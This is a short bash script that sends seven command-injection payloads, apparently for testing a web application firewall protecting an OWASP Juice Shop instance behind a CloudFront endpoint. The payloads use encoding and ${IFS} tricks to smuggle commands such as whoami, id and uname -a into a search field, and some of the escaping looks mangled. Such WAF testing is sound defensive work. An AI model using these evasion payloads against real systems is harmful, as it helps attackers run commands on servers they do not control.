#!/bin/bash
# WAF Bypass Test — CMDI (7 payloads)
# Run: bash curl_cmdi.sh

ENDPOINT="https://dlpaasrngb6ue.cloudfront.net"

echo "[cmdi] juiceshop-0125: %2526%2526whoami"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0125" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "%2526%2526whoami"}'
echo ""

echo "[cmdi] juiceshop-0126: $\{@print(md5(1234))\}"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0126" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "$\\\\{@print(md5(1234))\\\\}"}'
echo ""

echo "[cmdi] juiceshop-0140: $\{@print(md5(1))\}"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0140" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "$\\\\{@print(md5(1))\\\\}"}'
echo ""

echo "[cmdi] juiceshop-0143: %60uname%20-a%60"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0143" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "%60uname%20-a%60"}'
echo ""

echo "[cmdi] juiceshop-0342: sh$\{IFS\}-c$\{IFS\}whoami"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0342" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "sh$\\\\{IFS\\\\}-c$\\\\{IFS\\\\}whoami"}'
echo ""

echo "[cmdi] juiceshop-0343: bash$\{IFS\}-c$\{IFS\}'id'"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0343" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "bash$\\\\{IFS\\\\}-c$\\\\{IFS\\\\}\'id\'"}'
echo ""

echo "[cmdi] juiceshop-0344: $\{IFS\}'id'}"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0344" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "$\\\\{IFS\\\\}\'id\'}"}'
echo ""
